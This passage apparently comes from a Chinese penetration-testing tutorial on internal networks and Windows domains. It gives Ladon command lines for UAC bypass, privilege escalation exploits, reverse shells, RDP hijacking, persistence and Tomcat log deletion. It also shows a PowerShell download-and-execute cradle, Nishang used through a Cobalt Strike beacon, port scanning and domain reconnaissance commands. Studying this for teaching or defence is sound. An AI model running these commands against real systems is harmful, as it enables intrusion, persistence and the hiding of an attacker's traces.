Y21kIC9jIHN0YXJ0IGNhbGMuZXhlICYmIFJFTQ==##### 110 BypassUac2 绕过UAC执行,支持Win7-Win10Ladon BypassUac2 c:\1.exeLadon BypassUac2 c:\1.bat##### 111 PrintNightmare (CVE-2021-1675 | CVE-2021-34527)打印机漏洞提权EXPLadon PrintNightmare c:\evil.dllLadon CVE-2021-1675 c:\evil.dll##### 112 CVE-2022-21999 SpoolFool打印机漏洞提权EXPLadon SpoolFool poc.dllLadon CVE-2022-21999 poc.dll##### 113 GetSystem 提权System权限执行CMDLadon GetSystem cmd.exe##### 114 复制令牌执行CMD(如system权限降权exploer当前用户)Ladon GetSystem cmd.exe explorer##### 115 Runas 模拟用户执行命令Ladon Runas user pass cmd##### 116 MS16135提权至SYSTEMLadon ms16135 whoami##### 117 BadPotato服务用户提权至SYSTEMLadon BadPotato cmdline##### 118 SweetPotato服务用户提权至SYSTEMLadon SweetPotato cmdline##### 119 EfsPotato Win7-2019提权(服务用户权限提到system)Ladon EfsPotato whoami##### 120 Open3389一键开启3389Ladon Open3389##### 121 激活内置管理员AdministratorLadon ActiveAdmin##### 122 激活内置用户GuestLadon ActiveGuest### 反弹Shell##### 123 反弹TCP NC ShellLadon ReverseTcp 192.168.1.8 4444 nc##### 124 反弹TCP MSF ShellLadon ReverseTcp 192.168.1.8 4444 shell##### 125 反弹TCP MSF MET ShellLadon ReverseTcp 192.168.1.8 4444 meter##### 126 反弹HTTP MSF MET ShellLadon ReverseHttp 192.168.1.8 4444##### 127 反弹HTTPS MSF MET ShellLadon ReverseHttps 192.168.1.8 4444##### 128 反弹TCP CMD &amp; PowerShell ShellLadon PowerCat 192.168.1.8 4444 cmdLadon PowerCat 192.168.1.8 4444 psh##### 129 反弹UDP Cmd &amp; PowerShell ShellLadon PowerCat 192.168.1.8 4444 cmd udpLadon PowerCat 192.168.1.8 4444 psh udp##### 130 netsh本机888端口转发至112的22端口Ladon netsh add 888 192.168.1.112 22##### 131 PortTran端口转发(3389例子)VPS监听: Ladon PortTran 8000 338目标转发: Ladon PortTran 内网IP 3389 VPS_IP 8000本机连接: mstsc VPS_IP:338### 本机执行##### 132 RDP桌面会话劫持（无需密码）Ladon RdpHijack 3Ladon RdpHijack 3 console##### 133 添加注册表Run启动项Ladon RegAuto Test c:\123.exe##### 134 AT计划执行程序(无需时间)(system权限)Ladon at c:\123.exeLadon at c:\123.exe gui##### 135 SC服务加启动项&amp;执行程序(system权限）Ladon sc c:\123.exeLadon sc c:\123.exe guiLadon sc c:\123.exe auto ServerName### 系统信息探测##### 136 Snmp协议探测操作系统、设备等信息Ladon 192.168.1.8/24 SnmpScan##### 137 Nbt协议探测Windows主机名、域、用户Ladon 192.168.1.8/24 NbtInfo##### 138 Smb协议探测Windows版本、主机名、域Ladon 192.168.1.8/24 SmbInfo##### 139 Wmi协议探测Windows版本、主机名、域Ladon 192.168.1.8/24 WmiInfo##### 140 Mssql协议探测Windows版本、主机名、域Ladon 192.168.1.8/24 MssqlInfo##### 141 Winrm协议探测Windows版本、主机名、域Ladon 192.168.1.8/24 WinrmInfo##### 142 Exchange探测Windows版本、主机名、域Ladon 192.168.1.8/24 ExchangeInfo##### 143 Rdp协议探测Windows版本、主机名、域For单线程: Ladon 192.168.1.8/24 RdpInfo f=1### 其它功能##### 144 Win2008一键启用.net 3.5Ladon EnableDotNet##### 145 获取内网站点HTML源码Ladon gethtml http://192.168.1.1##### 146 一键迷你WEB服务器Ladon web 80Ladon web 80 dir获取外网IP(VPS上启动WEB,目标访问ip.txt或ip.jpg)http://192.168.1.8/ip.txt##### 147 getstr/getb64/debase64(无回显漏洞回显结果)监听 Ladon web 800提交 返回明文certutil.exe -urlcache -split -f http://192.168.1.8:800/getstr/test123456Base64加密结果certutil.exe -urlcache -split -f http://192.168.1.110:800/getbase64/k8gege520Base64结果解密certutil.exe -urlcache -split -fhttp://192.168.1.110:800/debase64/azhnZWdlNTIw##### 148 Shiro插件探测Ladon 192.168.1.8/24 IsShiro##### 149 LogDelTomcat 删除Tomcat指定IP日志Ladon LogDelTomcat access.log 192.168.1.8##### 150 C#自定义程序集插件扫描Ladon 192.168.1.8/24 Poc.exeLadon 192.168.1.8/24 *.dll(c#)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="assets/image-20221230120218287.png" alt="image-20221230120218287"></p><h1 id="内网端口扫描技术"><a href="#内网端口扫描技术" class="headerlink" title="内网端口扫描技术"></a>内网端口扫描技术</h1><p>通过查询目标主机的端口开放信息，不仅可以了解目标主机所开放的服务，还可以找出其开放服务的涌洞、分析目 标网络的拓扑结构等， 在进行内网渗测试时，通常会使用Metasploit内置的端口进行扫描。也可以上传端口扫描工 具，使用工具进行扫描。还可以根据服务器的环境，使用自定义的端口扫描脚本进行扫描。在获得授权的情况下， 可以直接使用Nmap、masscan等端口扫描工具获取开放的端口信息。</p><h2 id="ScanLine"><a href="#ScanLine" class="headerlink" title="ScanLine"></a>ScanLine</h2><p>ScanLine是一款windows下的端口扫描的命令行程序。它可以完成PING扫描、TCP端口扫描、UDP端口扫描等功 能。运行速度很快，不需要winPcap库支持，应用场合受限较少。 </p><p>用法</p><pre class="line-numbers language-none"><code class="language-none">‐？ ‐ 显示此帮助文本‐b ‐ 获取端口横幅‐c ‐ TCP 和 UDP 尝试超时（毫秒）。 默认值为 4000‐d ‐ 扫描之间的延迟（毫秒）。 默认为 0‐f ‐ 从文件中读取 IP。 使用“stdin”作为标准输入‐g ‐ 绑定到给定的本地端口‐h ‐ 隐藏没有开放端口的系统的结果‐i ‐ 除了 Echo 请求之外，用于 ping 使用 ICMP 时间戳请求‐j ‐ 不要在 IP 之间输出“‐‐‐‐‐...”分隔符‐l ‐ 从文件中读取 TCP 端口‐L ‐ 从文件中读取 UDP 端口‐m ‐ 绑定到给定的本地接口 IP‐n ‐ 不扫描端口 ‐ 仅 ping（除非您使用 ‐p）‐o ‐ 输出文件（覆盖）‐O ‐ 输出文件（追加）‐p ‐ 扫描前不要 ping 主机‐q ‐ ping 超时（毫秒）。 默认值为 2000‐r ‐ 将 IP 地址解析为主机名‐s ‐ 以逗号分隔格式输出 (csv)‐t ‐ 要扫描的 TCP 端口（以逗号分隔的端口/范围列表）‐T ‐ 使用 TCP 端口的内部列表‐u ‐ 要扫描的 UDP 端口（以逗号分隔的端口/范围列表）‐U ‐ 使用 UDP 端口的内部列表‐v ‐ 详细模式‐z ‐ 随机化 IP 和端口扫描顺序<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">scanline.exe ‐bhpt 21‐23,25,80,110,135‐139,143,443,445,1433,1521,3306,3389,5556,5631,5900,8080 192.168.70.14scanline.exe ‐bhpt 80,443 192.169.70.0/24scanline.exe -bhpt 0-65535 192.168.70.14<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="assets/image-20221230120436619.png" alt="image-20221230120436619"></p><h2 id="Telnet"><a href="#Telnet" class="headerlink" title="Telnet"></a>Telnet</h2><p>Telnet协议是TCP/IP协议族的一员，是Internet远程登录服务的标准协议和主要方式。它为用户提供了在本地计算 机上完成远程主机工作的能力。在目标计算机上使用Telnet协议，可以与目标服务器建立连接。如果只是想快速探 测某台主机的某个常规高危端口是否开放，使用telnet命令是最方便的</p><p><code>telnet + IP+端口</code></p><pre class="line-numbers language-none"><code class="language-none">telnet 192.168.70.14 445<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="assets/image-20221230120523004.png" alt="image-20221230120523004"></p><h2 id="RedTeamTool"><a href="#RedTeamTool" class="headerlink" title="RedTeamTool"></a>RedTeamTool</h2><p>RedTeamTool中有一个本地端口扫面的工具</p><pre class="line-numbers language-none"><code class="language-none">portscan.exe 10000<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="PowerSpioit"><a href="#PowerSpioit" class="headerlink" title="PowerSpioit"></a>PowerSpioit</h2><p>PowerSploit是一款基于PowerShell的后渗透框架软件，包含了很多PowerShell的攻击脚本，它们主要用于渗透中 的信息侦测，权限提升、权限维持等 </p><p>下载地址： <a href="https://github.com/PowerShellMafia/PowerSploit">https://github.com/PowerShellMafia/PowerSploit</a> </p><p>用法</p><pre class="line-numbers language-none"><code class="language-none">ActivirusBypass：发现杀毒软件的查杀特征CodeExecution：在目标主机上执行代码Exfiltration：目标主机上的信息搜集工具Mayhem：蓝屏等破坏性的脚本Persistence：后门脚本Privsec：提权等脚本Recon：以目标主机为跳板进行内网信息侦查ScriptModification：在目标主机上创建或修改脚本<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>本地执行</p><pre class="line-numbers language-none"><code class="language-none">powershell -exec bypass Import-Module .\Invoke-Portscan.ps1;Invoke-Portscan -Hosts 192.168.70.0/24 -T 4 -ports '445,8080,3389,80' -oA c:\1.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>远程执行 </p><p><code>python -m http.server 80</code> 开启http服务</p><pre class="line-numbers language-none"><code class="language-none">powershell -exec bypass -c IEX (New-Object System.Net.Webclient).DownloadString('http://192.168.70.130:80/Invoke-Portscan.ps1');Import-Module .\Invoke-Portscan.ps1;Invoke-Portscan -Hosts 192.168.70.14 -T 4 -ports '445,8080,3389,80' ‐oA c:\1.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="Nishang"><a href="#Nishang" class="headerlink" title="Nishang"></a>Nishang</h2><p>Nishang是一款针对PowerShell的渗透工具。说到渗透工具，那自然便是老外开发的东西。国人开发的东西，也不 是不行，只不过不被认可罢了。不管是谁开发的，既然跟渗透有关系，那自然是对我们有帮助的，学习就好。来源 什么的都不重要。总之，nishang也是一款不可多得的好工具。非常的好用。</p><p> 下载地址 <a href="https://github.com/samratashok/nishang">https://github.com/samratashok/nishang</a> </p><p>课后阅读 <a href="https://dude6.com/article/116047.html">https://dude6.com/article/116047.html</a> </p><p>使用方式</p><pre class="line-numbers language-none"><code class="language-none">#允许导入powershell Set-ExecutionPolicy remotesigned #导入模块powershell Import-Module .\nishang\nishang.psm1#扫描powershell Invoke-PortScan -StartAddress 192.168.70.1 -EndAddress 192.168.70.21 -ResolveHost#或者导入+扫描powershell -command "&amp; { import-module .\nishang\nishang.psm1; Invoke-PortScan -StartAddress 192.168.70.1 -EndAddress 192.168.70.21 -ResolveHost -ScanPort -port 445 }"<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>CS导入nishang</p><pre class="line-numbers language-none"><code class="language-none">#导入各种powershell脚本，这里可以导入nishang模块beacon&gt; powershell-import nishang\nishang.psm1#执行beacon&gt; powershell powershell的脚本名或者beacon&gt; powershell Check‐VMpowershell Invoke-PortScan -StartAddress 192.168.70.1 -EndAddress 192.168.70.21 -ResolveHost<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="assets/image-20221230120932924.png" alt="image-20221230120932924"></p><h2 id="Kscan-1"><a href="#Kscan-1" class="headerlink" title="Kscan"></a>Kscan</h2><pre class="line-numbers language-none"><code class="language-none">kscan.exe -t 192.168.70.14 -p 1-65535 --encoding gb2312<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="assets/image-20221230120946681.png" alt="image-20221230120946681"></p><h2 id="fscan-1"><a href="#fscan-1" class="headerlink" title="fscan"></a>fscan</h2><pre class="line-numbers language-none"><code class="language-none">fscan.exe -h 192.168.70.14 -p 1-65535<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="assets/image-20221230121001809.png" alt="image-20221230121001809"></p><h2 id="常见端口服务"><a href="#常见端口服务" class="headerlink" title="常见端口服务"></a>常见端口服务</h2><h3 id="文件共享服务端口"><a href="#文件共享服务端口" class="headerlink" title="文件共享服务端口"></a>文件共享服务端口</h3><table><thead><tr><th>端 口 号</th><th>端口说明</th><th>使用说明</th></tr></thead><tbody><tr><td>21、22、69</td><td>FTP/ FTP 文件传输协议</td><td>允许匿名的上传、下载、爆破和嗅探操作</td></tr><tr><td>2049</td><td>NFS 服务</td><td>配置不当</td></tr><tr><td>139</td><td>SAMBA 服务</td><td>爆破、未授权访问、远程代码执行</td></tr><tr><td>389</td><td>LDAP 目录访问协议</td><td>注入、允许匿名访问、弱口令</td></tr></tbody></table><h3 id="远程连接服务端口"><a href="#远程连接服务端口" class="headerlink" title="远程连接服务端口"></a>远程连接服务端口</h3><table><thead><tr><th>端 口 号</th><th>端口说明</th><th>使用说明</th></tr></thead><tbody><tr><td>22</td><td>SSH远程连接</td><td>爆破、 SSH隧道及内网代理转发、文件传输</td></tr><tr><td>23</td><td>Telnet 远程连接</td><td>爆破、嗅探、弱口令</td></tr><tr><td>3389</td><td>RDP 远程桌面连接</td><td>Shift 后门 (2003 以下版本） 爆破</td></tr><tr><td>5900</td><td>VNC</td><td>弱口令爆破</td></tr><tr><td>5632</td><td>PcAnywhere 服务</td><td>抓取密码、代码执行</td></tr></tbody></table><h3 id="Web-应用服务端口"><a href="#Web-应用服务端口" class="headerlink" title="Web 应用服务端口"></a>Web 应用服务端口</h3><table><thead><tr><th>端 口 号</th><th>端口说明</th><th>使用说明</th></tr></thead><tbody><tr><td>80、443、8080</td><td>常见的Web 服务端口</td><td>Web 攻击、爆破、对应服务器版本漏洞</td></tr><tr><td>7001 、7002</td><td>WebLogic 控制台</td><td>Java 反序列化、弱口令</td></tr><tr><td>8080 、8089</td><td>JBoss/Resin/Jetty/Jenkins</td><td>反序列化、控制台弱口令</td></tr><tr><td>9090</td><td>WebSphere 控制台</td><td>Java 反序列化、弱口令</td></tr><tr><td>4848</td><td>GlassFish 控制台</td><td>弱口令</td></tr><tr><td>1352</td><td>Lotus Domino 邮件服务</td><td>弱口令、信息泄露、爆破</td></tr><tr><td>10000</td><td>webmin 控制面板</td><td>弱口令</td></tr></tbody></table><h3 id="数据库服务端口"><a href="#数据库服务端口" class="headerlink" title="数据库服务端口"></a>数据库服务端口</h3><table><thead><tr><th>端 口 号</th><th>端口说明</th><th>使用说明</th></tr></thead><tbody><tr><td>3306</td><td>MySQL 数据库</td><td>注入、提权、爆破</td></tr><tr><td>1433</td><td>MSSQL 数据库</td><td>注入、提权、SA 弱口令、爆破</td></tr><tr><td>1521</td><td>Oracle 数据库</td><td>1N S 爆破、注入、反弹Shell</td></tr><tr><td>5432</td><td>Post greSQL数据库</td><td>爆破、注入、弱口令</td></tr><tr><td>27017 、27018</td><td>MongoDB 数据库</td><td>爆破、未授权访问</td></tr><tr><td>6379</td><td>Redis 数据库</td><td>可尝试未授权访问、弱口令爆破</td></tr><tr><td>5000</td><td>Sysbase/DB2 数据库</td><td>爆破、注入</td></tr></tbody></table><h3 id="邮件服务端口"><a href="#邮件服务端口" class="headerlink" title="邮件服务端口"></a>邮件服务端口</h3><table><thead><tr><th>端 口 号</th><th>端口说明</th><th>使用说明</th></tr></thead><tbody><tr><td>25</td><td>SMTP 邮件服务</td><td>邮件伪造</td></tr><tr><td>110</td><td>POP3 协议</td><td>爆破、嗅探</td></tr><tr><td>143</td><td>IMAP 协议</td><td>爆破</td></tr></tbody></table><h3 id="网络常见协议端口"><a href="#网络常见协议端口" class="headerlink" title="网络常见协议端口"></a>网络常见协议端口</h3><table><thead><tr><th>端 口 号</th><th>端口说明</th><th>使用说明</th></tr></thead><tbody><tr><td>53</td><td>DNS 域名系统</td><td>允许区域传送、DNS 劫持、缓存投毒、欺骗</td></tr><tr><td>67、68</td><td>DHCP 服务</td><td>劫持、欺骗</td></tr><tr><td>161</td><td>SNMP 协议</td><td>爆破、搜集目标内网信息</td></tr></tbody></table><p>特殊服务端口</p><table><thead><tr><th>端 口 号</th><th>端口说明</th><th>使用说明</th></tr></thead><tbody><tr><td>2181</td><td>ZooKeeper 服务</td><td>未授权访问</td></tr><tr><td>8069</td><td>Zabbix 服务</td><td>远程执行、SQL 注入</td></tr><tr><td>9200 、9300</td><td>Elasticsearcb 服务</td><td>远程执行</td></tr><tr><td>11211</td><td>Memcached 服务</td><td>未授权访问</td></tr><tr><td>512、513、514</td><td>Linux rexec 服务畴</td><td>爆破、远程登录</td></tr><tr><td>873</td><td>rsync 服务</td><td>匿名访问、文件上传</td></tr><tr><td>3690</td><td>SVN 服务</td><td>SVN 泄露、未授权访问</td></tr><tr><td>50000</td><td>SAP Management Console</td><td>远程执行</td></tr></tbody></table><h1 id="域内基础信息收集"><a href="#域内基础信息收集" class="headerlink" title="域内基础信息收集"></a>域内基础信息收集</h1><h2 id="查询权限"><a href="#查询权限" class="headerlink" title="查询权限"></a>查询权限</h2><p>查看当前权限命令如下 </p><pre class="line-numbers language-none"><code class="language-none">whoami<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>获取台主机的权限后,有四种情况: </p><ol><li><p>本地普通用户:当前为本机的user用户 </p><p><img src="assets/image-20221230125551970.png" alt="image-20221230125551970"></p></li><li><p>本地管理员用户:当前为本机的admmistrator </p><p><img src="assets/image-20221230125559928.png" alt="image-20221230125559928"></p></li><li><p>域内用户:当前为域内普通用户 </p><p><img src="assets/image-20221230125618969.png" alt="image-20221230125618969"></p></li><li><p>域内用户:当前为hacke域内的administrator用户</p></li><li><p><img src="assets/image-20221230125627714.png" alt="image-20221230125627714"></p></li></ol><p> 在这四种情况中。</p><ul><li>如果当前内网中存在域,那么<strong>本地普通用户</strong>只能查询本机相关信息,不能查询域内信息. </li><li>而<strong>本地管理员用户</strong>和<strong>域内用户</strong>可以查询域内信息.</li></ul><p>其原理是:</p><p>域内的所有查询都是通过<strong>域控制器</strong>实现的（基于LDAP协议）,而这个查询需要经过权限认证,所以,只有<strong>域用户</strong>才拥有这个权限;当域用户执行查询命令时,会自动使用Kerberos协议进行认证,无须额外输人账 号和密码 </p><p><strong>本地管理员</strong>Admmistrator权限可以直接提升为Ntauthority或System权限,因此,在域中,除普通用户外,所有的机器都有一个机器用户（用户名是机器名加上”$”）。在本质上,机器的system用户对应的就是域里面的机器用户，所以,使用 System权限可以运行域内的查询命令。 </p><h2 id="判断域的存在"><a href="#判断域的存在" class="headerlink" title="判断域的存在"></a>判断域的存在</h2><p>获得了本机的相关信息后’就要判断当前内网中是否存在域°如果当前内网中存在域,就需要判断所控主机是否在域 内，下面讲解几种方法。</p><h3 id="1、Ipconfig-x2F-all命令"><a href="#1、Ipconfig-x2F-all命令" class="headerlink" title="1、Ipconfig /all命令"></a>1、Ipconfig /all命令</h3><pre class="line-numbers language-none"><code class="language-none">ipconfig /all<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>执行命令,可以查看网关IP地址、DNS的IP地址,域名、本机是否和DNS服务器处于同一网段等信息</p><p><img src="assets/image-20221230125725181.png" alt="image-20221230125725181"></p><p>然后,通过反向解析查询命令nslookup来解析域名的IP地址。用解析得到的IP地址进行对比判断域控制器和DNS服 务器是否在同—台服务器上。</p><pre class="line-numbers language-none"><code class="language-none">nslookup hack.com<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="assets/image-20221230125732999.png" alt="image-20221230125732999"></p><h3 id="2、SystemInfo"><a href="#2、SystemInfo" class="headerlink" title="2、SystemInfo"></a>2、SystemInfo</h3><pre class="line-numbers language-none"><code class="language-none">systeminfo<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>执行如下命令,”域”即域名,登录服务器”为域控制器°如果”域’为”WORKGROUP”,表示当前服务器不在域内</p><p><img src="assets/image-20221230125757352.png" alt="image-20221230125757352"></p><h3 id="3、net-config-workstation"><a href="#3、net-config-workstation" class="headerlink" title="3、net config workstation"></a>3、net config workstation</h3><pre class="line-numbers language-none"><code class="language-none">net config workstation<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="assets/image-20221230125811938.png" alt="image-20221230125811938"></p><h3 id="4、Net-time-x2F-domain"><a href="#4、Net-time-x2F-domain" class="headerlink" title="4、Net time /domain"></a>4、Net time /domain</h3><pre class="line-numbers language-none"><code class="language-none">net time /domain<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>一般会有如下三种情况: </p><p>1.存在域，但当前用户不是域用户</p><p><img src="assets/image-20221230125838705.png" alt="image-20221230125838705"></p><p>2.存在域，并且当前用户是域用户 </p><p><img src="assets/image-20221230130034611.png" alt="image-20221230130034611"></p><p>3.当前网络环境为工作组，不存在域</p><p><img src="assets/image-20221230130041380.png" alt="image-20221230130041380"></p><p>确定了当前内网拥有的域,且所控制的主机在域内,就可以进行域内相关信息的收集了。介绍的查询命令在本质上都 是通过LDAP协议到域控制器上进行查询的,所以在查询 时需要进行权限认证。只有域用户才拥有此权限,本地用户无 法运行本节介绍的查询命令( System 权限用户除外。在域中,除普通用户外,所有的机器都有一个机器用户,其用户名 为机器名加上 “$”。 System权限用户对应的就是域里面的机器用户,所以System权限用户可以运行本节介绍 的查询 命令)</p><h2 id="NET命令详解"><a href="#NET命令详解" class="headerlink" title="NET命令详解"></a>NET命令详解</h2><p>NET命令是一个命令行命令，Net命令有很多函数用于实用和核查计算机之间的NetBIOS连接，可以查看我们的管 理网络环境、服务、用户、登陆等信息内容；要想获得Net 的HELP可以(1)在Windows下可以用图形的方式，开始- &gt;帮助-&gt;索引-&gt;输入NET；(2)在COMMAND下可以用字符方式：NET /?或NET或NET HELP取得相应的方法的帮助。 所有Net命令接受选项/yes和/no(可缩写为/y和/n)。</p><table><thead><tr><th>主要命令</th><th></th><th></th><th></th><th></th></tr></thead><tbody><tr><td>NET View</td><td>NET User</td><td>NET Use</td><td>NET Time</td><td>Net Start</td></tr><tr><td>Net Pause</td><td>Net Continue</td><td>NET Stop</td><td>Net Statistics</td><td>Net Share</td></tr><tr><td>Net Session</td><td>Net Send</td><td>Net Print</td><td>Net Name</td><td>Net Localgroup</td></tr><tr><td>Net Group</td><td>Net File</td><td>Net Config</td><td>Net Computer</td><td>Net Accounts</td></tr></tbody></table><h3 id="Net-View"><a href="#Net-View" class="headerlink" title="Net View"></a>Net View</h3><pre class="line-numbers language-none"><code class="language-none">作用：显示域列表、计算机列表或指定计算机的共享资源列表。命令格式：`Net view [\\computername | /domain[:domainname]]`有关参数说明：‐ 键入不带参数的`net view`显示当前域的计算机列表‐ `\\computername` 指定要查看其共享资源的计算机‐ `/domain[:domainname]`指定要查看其可用计算机的域例如：#查看计算机的共享资源列表。Net view #指定dc计算机的共享资源列表net view \\dc#查看hack域中的机器列表Net view /domain:hack <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="Net-User"><a href="#Net-User" class="headerlink" title="Net User"></a>Net User</h3><pre class="line-numbers language-none"><code class="language-none">作用：添加或更改用户帐号或显示用户帐号信息。命令格式：`Net user [username [password | *] [options]] [/domain]`有关参数说明：‐ 键入不带参数的Net user查看计算机上的用户帐号列表‐ username添加/add、删除/del、更改或查看用户帐号名‐ password为用户帐号分配或更改密码‐ 提示输入密码‐ `/domain`在计算机主域的主域控制器中执行操作。该参数仅在Windows NT Server 域成员的 Windows NT Workstation 计算机上可用。默认情况下，Windows NT Server 计算机在主域控制器中执行操作。注意：在计算机主域的主域控制器发生该动作。它可能不是登录域。例如：#查看用户GHQ123的信息。Net user ghq123#查看域用户net user /domain<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="Net-Use"><a href="#Net-Use" class="headerlink" title="Net Use"></a>Net Use</h3><pre class="line-numbers language-none"><code class="language-none">作用：连接计算机或断开计算机与共享资源的连接，或显示计算机的连接信息。命令格式：`Net use [devicename | *] [\\computername\sharename[\volume]] no}]]` password|*] [[/delete]| [/persistent:{yes |有关参数说明：‐ 键入不带参数的Net use列出网络连接‐ devicename指定要连接到的资源名称或要断开的设备名称‐ `\\computername\sharename`服务器及共享资源的名称‐ password访问共享资源的密码‐ *提示键入密码‐ `/user`指定进行连接的另外一个用户‐ `domainname`指定另一个域‐ `username`指定登录的用户名‐ `/home`将用户连接到其宿主目录‐ `/delete`取消指定网络连接‐ `/persistent`控制永久网络连接的使用。例如：#将\GHQ\TEMP目录建立为F盘Net use f: \\GHQ\TEMP #断开连接。Net use f: \GHQ\TEMP /delete <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="Net-Time"><a href="#Net-Time" class="headerlink" title="Net Time"></a>Net Time</h3><pre class="line-numbers language-none"><code class="language-none">作用：使计算机的时钟与另一台计算机或域的时间同步。命令格式：`Net time [\\computername | /domain[:name]] [/set]`有关参数说明：‐ 